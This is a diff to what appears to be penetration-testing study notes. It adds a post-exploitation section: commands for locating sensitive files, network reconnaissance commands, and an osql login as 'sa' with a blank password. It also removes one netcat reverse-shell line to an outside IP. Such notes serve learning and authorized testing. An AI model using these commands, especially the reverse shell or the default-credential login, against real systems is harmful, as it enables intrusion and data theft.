@@ -208,5 +208,31 @@ Example: d -d 127.0.0.1 -h 204.139.95.100 -P 2222
 Summary: 
 	- Attack plans consist of turning the vulnerabilities of a target into a plan of action for compromise
 
+Intro to Post Exploitation
+- Sensitive Information is often stored in easily located folders like, User desktops, "My Documents" folder, and User-created directories
+Attrib and Findstr Syntax
+	- Attrib /D /S c:\*keyword*.* (Find any filename or folder name with keyword.)
+	- Findstr /P /I /S "keyword" C:\*.* (Find any files that contain the keyword.)
+Recon of Active Connections:
+	- Net use: mapped network shared
+	- Netstat -an: active network connections
+	- ARP table entries: arp -a
+	- Routing table entries: route PRINT
+	- Network interface settings: ipconfig /all
+OSQL Syntax:
+	Options:
+		-U login id
+		-P password
+		-S server
+		-H hostname
+		-E trusted connection
+		-d use database name
+		-l login timeout
+		-t query timeout 
+		-L list servers
+		-q "cmdline query"
+		-Q "cmdline query" and exit
+		-i inputfile
+		-o outputfile
+Example: osql -U sa -P "" -S 192.168.0.5 -Q "select @@version"
 
-start c:\inetpub\scripts\nc.exe 204.139..100 1111 -e cmd.exe
